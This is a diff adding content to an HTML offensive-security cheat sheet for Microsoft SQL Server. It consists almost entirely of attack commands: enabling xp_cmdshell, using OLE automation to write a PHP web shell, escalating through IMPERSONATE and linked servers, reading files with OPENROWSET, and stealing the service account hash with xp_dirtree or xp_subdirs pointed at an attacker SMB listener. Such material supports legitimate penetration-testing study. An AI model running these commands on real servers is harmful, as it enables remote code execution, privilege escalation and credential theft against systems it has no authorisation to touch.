@@ -117,23 +117,96 @@ sqlcmd <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> 
 xp_cmdshell <span class="s1">'whoami'</span>
 GO <span class="c"># necessary to process commands with sqlcmd</span>
 
+<span class="c">############</span>
 <span class="c"># if xp_cmdshell is not enabled with we have proper permissions</span>
 <span class="c"># to change that, enable it:</span>
 
 <span class="c"># allow advanced options to be changed</span>
+<span class="c"># and enable xp_cmdshell</span>
 EXECUTE sp_configure <span class="s1">'show advanced options'</span>, 1
 GO
-
-<span class="c"># update configured value for advanced options</span>
 RECONFIGURE
 GO
-
-<span class="c"># enable xp_cmdshell</span>
 EXECUTE sp_configure <span class="s1">'xp_cmdshell'</span>, 1
 GO
-
-<span class="c"># update configured value for xp_cmdshell</span>
 RECONFIGURE
+GO
+<span class="c">############</span>
+
+<span class="c">############</span>
+<span class="c"># enable writing files with MSSQL if you have admin privileges:</span>
+
+<span class="c"># for this, enable ole automation procedures</span>
+sp_configure <span class="s1">'show advanced options'</span>, 1
+GO
+RECONFIGURE
+GO
+sp_configure <span class="s1">'Ole Automation Procedures'</span>, 1
+GO
+RECONFIGURE
+GO
+
+<span class="c"># then, create a file</span>
+<span class="c"># a very simple and easy to remember process!</span>
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate <span class="s1">'Scripting.FileSystemObject'</span>, @OLE OUT
+EXECUTE sp_OAMethod @OLE, <span class="s1">'OpenTextFile'</span>, @FileID OUT, <span class="s1">'c:\&lt;path&gt;'</span>, 8, 1
+EXECUTE sp_OAMethod @FileID, <span class="s1">'WriteLine'</span>, Null, <span class="s1">'&lt;?php echo shell_exec($_GET["c"]);?&gt;'</span>
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+GO
+<span class="c">############</span>
+
+<span class="c">############</span>
+<span class="c"># leveraging the impersonate permission, which allows</span>
+<span class="c"># you to take the permissions of another user. what</span>
+<span class="c"># could possibly go wrong?</span>
+
+<span class="c"># identify users that you can impersonate</span>
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id <span class="o">=</span> b.principal_id
+WHERE a.permission_name <span class="o">=</span> <span class="s1">'IMPERSONATE'</span>
+GO
+
+<span class="c"># verify current user and associated role</span>
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
+GO
+
+<span class="c"># impersonate a user</span>
+<span class="c"># run this within the master DB,</span>
+<span class="c"># as everyone as access to it.</span>
+EXECUTE AS LOGIN <span class="o">=</span> <span class="s1">'&lt;username&gt;'</span>
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
+GO
+
+<span class="c"># use REVERT to quit impersonation</span>
+REVERT
+GO
+<span class="c">############</span>
+
+<span class="c">############</span>
+<span class="c"># leveraging the linked servers configuration, which</span>
+<span class="c"># allows you to execute statements to external, but</span>
+<span class="c"># linked SQL servers or other database products.</span>
+<span class="c"># what could possibly go wrong?</span>
+
+<span class="c"># identify linked servers in MSSQL</span>
+SELECT srvname, isremote FROM sysservers
+GO
+
+<span class="c"># identify the user used for the connection between</span>
+<span class="c"># the servers</span>
+EXECUTE<span class="o">(</span><span class="s1">'select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')'</span><span class="o">)</span> AT <span class="o">[</span>&lt;IP address&gt;<span class="se">\&lt;</span>server name&gt;]
+GO
+<span class="c">############</span>
+
+<span class="c"># read file with MSSQL, according to your system permissions</span>
+SELECT <span class="k">*</span> FROM OPENROWSET<span class="o">(</span>BULK N<span class="s1">'C:/&lt;path&gt;'</span>, SINGLE_CLOB<span class="o">)</span>
 GO
 
 <span class="c"># scan MSSQL server with nmap</span>
@@ -141,6 +214,14 @@ GO
 
 <span class="c"># login with mssqlclient.py</span>
 python3 mssqlclient.py &lt;username&gt;@&lt;IP address&gt; <span class="nt">-windows-auth</span>
+
+<span class="c"># with responder or impacket-smbserver listening, steal MSSQL service hash</span>
+EXEC master..xp_dirtree <span class="s1">'\\&lt;IP address&gt;\share\'</span>
+GO
+
+<span class="c"># or alternatively</span>
+EXEC master..xp_subdirs <span class="s1">'\\&lt;IP address&gt;\share\'</span>
+GO
 </code></pre></div>
 
 <h2>references</h2>
